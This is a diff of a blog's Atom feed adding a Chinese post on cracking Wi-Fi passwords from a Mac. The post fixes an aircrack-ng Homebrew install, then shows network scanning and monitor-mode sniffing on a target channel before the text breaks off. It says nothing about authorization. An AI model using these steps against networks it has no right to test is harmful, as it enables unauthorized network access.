@@ -8,7 +8,477 @@
     <author>
       <name>Moon</name>
     </author>
-    <updated>2021-12-27T02:58:59.000Z</updated>
+    <updated>2022-01-19T08:04:44.000Z</updated>
+    <entry>
+        <id>https://mo-onstudy.com/2022/01/19/M1mac%E5%AE%89%E8%A3%85aircrack-ng/</id>
+        <title>使用Mac破解Wi-Fi</title>
+        <link rel="alternate" href="https://mo-onstudy.com/2022/01/19/M1mac%E5%AE%89%E8%A3%85aircrack-ng/"/>
+        <content type="html">&lt;h2 id=&#34;aircrack-ng安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aircrack-ng安装&#34;&gt;#&lt;/a&gt; aircrack-ng 安装&lt;/h2&gt;
+&lt;p&gt;brew 安装报错&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# brew 安装&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;brew &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; aircrack-ng&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 报错信息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Error: aircrack-ng: no bottle available&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;You can try to &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; from &lt;span class=&#34;token builtin class-name&#34;&gt;source&lt;/span&gt; with:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  brew &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; --build-from-source aircrack-ng&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Please note building from &lt;span class=&#34;token builtin class-name&#34;&gt;source&lt;/span&gt; is unsupported. You will encounter build&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;failures with some formulae. If you experience any issues please create pull&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;requests instead of asking &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;help&lt;/span&gt; on Homebrew&#39;s GitHub, Twitter or any other&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;official channels.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;解决报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解决报错&#34;&gt;#&lt;/a&gt; 解决报错&lt;/h2&gt;
+&lt;p&gt;根据 github 中大佬的&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0hvbWVicmV3L2hvbWVicmV3LWNvcmUvcHVsbC83Njk5Mw==&#34;&gt;解决方案&lt;/span&gt;，修改&lt;span class=&#34;kbd red&#34;&gt; aircrack-ng.rb&lt;/span&gt; 文件，文件位置&lt;span class=&#34;kbd red&#34;&gt; /opt/homebrew/Library/Taps/homebrew/homebrew-core/Formula/aircrack-ng.rb&lt;/span&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;span&gt;aircrack-ng.rb links:https://github.com/areese/homebrew-core/blob/5f0518be9014b25ac963593cb5c2d6da68cacafb/Formula/aircrack-ng.rb 链接&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;AircrackNg&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;Formula&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  desc &lt;span class=&#34;token string&#34;&gt;&#34;Next-generation aircrack with lots of new features&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  homepage &lt;span class=&#34;token string&#34;&gt;&#34;https://aircrack-ng.org/&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  url &lt;span class=&#34;token string&#34;&gt;&#34;https://download.aircrack-ng.org/aircrack-ng-1.6.tar.gz&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  sha256 &lt;span class=&#34;token string&#34;&gt;&#34;4f0bfd486efc6ea7229f7fbc54340ff8b2094a0d73e9f617e0a39f878999a247&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  license all_of&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;GPL-2.0-or-later&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;BSD-3-Clause&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;OpenSSL&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  livecheck &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    url &lt;span class=&#34;token symbol&#34;&gt;:homepage&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    regex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token regex&#34;&gt;/href=.*?aircrack-ng[._-]v?(\d+(?:\.\d+)+)\.t/i&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  bottle &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sha256 big_sur&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;     &lt;span class=&#34;token string&#34;&gt;&#34;8a131a99a89edd127981b9dc2c91df91ba7a03b7c0d6c74521392e1649fa7d09&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sha256 catalina&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;1b5ecf42ef840c108536eac5107cf63c514ca2f3d7e8c4f32e5b301f088729c1&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sha256 mojave&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;      &lt;span class=&#34;token string&#34;&gt;&#34;e6bbba9c16ac26aaacaad5ac4935100a79cf702ab8fcb35fa9797e806ec003fe&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sha256 high_sierra&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;fad333ea8e2792d88305c22b62549f63900ea32aa3f856de57d6e8d70740cd49&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;autoconf&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token symbol&#34;&gt;:build&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;automake&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token symbol&#34;&gt;:build&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;libtool&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token symbol&#34;&gt;:build&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;pkg-config&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token symbol&#34;&gt;:build&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;openssl@1.1&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;pcre&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  depends_on &lt;span class=&#34;token string&#34;&gt;&#34;sqlite&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token comment&#34;&gt;# Remove root requirement from OUI update script. See:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token comment&#34;&gt;# https://github.com/Homebrew/homebrew/pull/12755&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  patch &lt;span class=&#34;token symbol&#34;&gt;:DATA&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token method-definition&#34;&gt;&lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    system &lt;span class=&#34;token string&#34;&gt;&#34;./autogen.sh&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;--disable-silent-rules&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                           &lt;span class=&#34;token string&#34;&gt;&#34;--disable-dependency-tracking&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                           &lt;span class=&#34;token string&#34;&gt;&#34;--prefix=&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token delimiter tag&#34;&gt;#&amp;#123;&lt;/span&gt;prefix&lt;span class=&#34;token delimiter tag&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                           &lt;span class=&#34;token string&#34;&gt;&#34;--with-experimental&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# On MacOS X, some of the c++ header files #include &amp;lt;version&gt; and the makefile has -I. causing problems&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    on_macos &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      mv &lt;span class=&#34;token string&#34;&gt;&#34;version&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;version.txt&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    system &lt;span class=&#34;token string&#34;&gt;&#34;make&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;install&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token method-definition&#34;&gt;&lt;span class=&#34;token function&#34;&gt;caveats&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string heredoc-string&#34;&gt;&lt;span class=&#34;token delimiter symbol&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&amp;lt;~&lt;/span&gt;EOS&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      Run `airodump-ng-oui-update` install or update the Airodump-ng OUI file.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token delimiter symbol&#34;&gt;EOS&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  test &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    system &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token delimiter tag&#34;&gt;#&amp;#123;&lt;/span&gt;bin&lt;span class=&#34;token delimiter tag&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;/aircrack-ng&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;--help&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;执行安装命令，安装成功&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;brew &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; --build-from-source aircrack-ng&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;破解wi-fi密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解wi-fi密码&#34;&gt;#&lt;/a&gt; 破解 Wi-Fi 密码&lt;/h2&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# airport 软链接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ln&lt;/span&gt; -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 查看网卡名称&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ifconfig&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 扫描 Wi-Fi 列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;airport -s&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# SSID 表示 Wi-Fi 名称・BSSID 表示 Wi-Fi 设备的硬件地址&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# RSSI 表示信号强度，值是负数，绝对值越小信号越强&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# CHANNEL 表示 Wi-Fi 信道&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# HT 表示吞吐量模式，一般都为 Y&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# CC 表示国家，中国为 CN&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# SECURITY 表示加密方式&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 开启网卡的监听模式&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;en0 sniff &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 3 为信道，需对应要破解的 Wi-Fi 信道&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;等待一段时间，期间需要有新终端连接 Wi-Fi，新开一个终端&lt;/p&gt;
